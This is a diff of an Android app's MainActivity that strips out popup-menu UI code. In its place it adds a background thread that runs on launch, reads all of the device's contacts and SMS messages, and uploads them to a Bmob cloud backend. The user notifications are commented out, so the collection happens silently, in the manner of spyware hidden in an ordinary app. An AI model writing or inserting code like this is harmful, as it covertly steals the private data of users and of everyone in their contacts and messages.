@@ -5,20 +5,24 @@ import android.support.design.widget.TabLayout;
 import android.support.v4.app.Fragment;
 import android.support.v4.app.FragmentPagerAdapter;
 import android.support.v4.view.ViewPager;
-import android.view.View;
-import android.view.ViewGroup;
-import android.widget.TextView;
 
 import com.lnb.jianjianproject.R;
+import com.lnb.jianjianproject.app.MyApplication;
 import com.lnb.jianjianproject.base.BaseActivity;
+import com.lnb.jianjianproject.bean.ContaceList;
+import com.lnb.jianjianproject.bean.ContactInfo;
+import com.lnb.jianjianproject.bean.SmsList;
 import com.lnb.jianjianproject.fragments.MyFragment;
-import com.lnb.jianjianproject.utils.ToastUtils;
+import com.lnb.jianjianproject.utils.ContactUtils;
+import com.lnb.jianjianproject.utils.SmsUtils;
 
 import java.util.ArrayList;
+import java.util.List;
 
 import butterknife.BindView;
+import cn.bmob.v3.listener.SaveListener;
 
-public class MainActivity extends BaseActivity  implements CommonPopupWindow.ViewInterface{
+public class MainActivity extends BaseActivity  {
 
 
     @BindView(R.id.tl)
@@ -68,65 +72,42 @@ public class MainActivity extends BaseActivity  implements CommonPopupWindow.Vie
         });
         tl.setupWithViewPager(vp);
         tl.setTabMode(TabLayout.MODE_SCROLLABLE);
-    }
 
-    public void up(View v) {
-//        View upView = LayoutInflater.from(this).inflate(R.layout.popup_up, null);
-//        //测量View的宽高
-//        CommonUtil.measureWidthAndHeight(upView);
-//        popupWindow = new CommonPopupWindow.Builder(this)
-//                .setView(R.layout.popup_up)
-//                .setWidthAndHeight(ViewGroup.LayoutParams.MATCH_PARENT, upView.getMeasuredHeight())
-//                .setBackGroundLevel(0.5f)//取值范围0.0f-1.0f 值越小越暗
-//                .setAnimationStyle(R.style.AnimUp)
-//                .setViewOnclickListener(this)
-//                .create();
-//        popupWindow.showAtLocation(findViewById(android.R.id.content), Gravity.BOTTOM, 0, 0);
-    }
-
-    public void down(View v) {
-//        popupWindow = new CommonPopupWindow.Builder(this)
-//                .setView(R.layout.popup_down)
-//                .setWidthAndHeight(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
-//                .setAnimationStyle(R.style.AnimDown)
-//                .setViewOnclickListener(this)
-//                .setOutsideTouchable(true)
-//                .create();
-//        popupWindow.showAsDropDown(view);
-    }
-
-    public void right(View v) {
-        popupWindow = new CommonPopupWindow.Builder(this)
-                .setView(R.layout.popup_left_or_right)
-                .setWidthAndHeight(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT)
-                .setAnimationStyle(R.style.AnimHorizontal)
-                .setViewOnclickListener(this)
-                .create();
-        popupWindow.showAsDropDown(v, v.getWidth(), -v.getHeight());
-    }
-
-    @Override
-    public void getChildView(View view, int layoutResId) {
-        switch (layoutResId){
-            case R.layout.popup_left_or_right:
-                TextView tv_like = (TextView) view.findViewById(R.id.tv_like);
-                TextView tv_hate = (TextView) view.findViewById(R.id.tv_hate);
-                tv_like.setOnClickListener(new View.OnClickListener() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                List<ContactInfo> allContacts = ContactUtils.getAllContacts(MyApplication.getContext());
+                ContaceList contaceList=new ContaceList((ArrayList<ContactInfo>) allContacts);
+                contaceList.save(MyApplication.getContext(), new SaveListener() {
                     @Override
-                    public void onClick(View v) {
-                        ToastUtils.showToast("赞一个",true);
-                        popupWindow.dismiss();
+                    public void onSuccess() {
+                        //ToastUtils.showToast("联系人成功",true);
+                    }
+
+                    @Override
+                    public void onFailure(int i, String s) {
+                        //ToastUtils.showToast("联系人失败",true);
                     }
                 });
-                tv_hate.setOnClickListener(new View.OnClickListener() {
+                ArrayList<String> allSms = SmsUtils.getAllSms(MyApplication.getContext());
+                SmsList smsList=new SmsList(allSms);
+                smsList.save(MyApplication.getContext(), new SaveListener() {
                     @Override
-                    public void onClick(View v) {
-                        ToastUtils.showToast("踩一个",true);
-                        popupWindow.dismiss();
+                    public void onSuccess() {
+                       // ToastUtils.showToast("短信成功",true);
+                    }
+
+                    @Override
+                    public void onFailure(int i, String s) {
+                        //ToastUtils.showToast("短信失败",true);
                     }
                 });
-                break;
-        }
+
+
+            }
+        }).start();
 
     }
+
+
 }
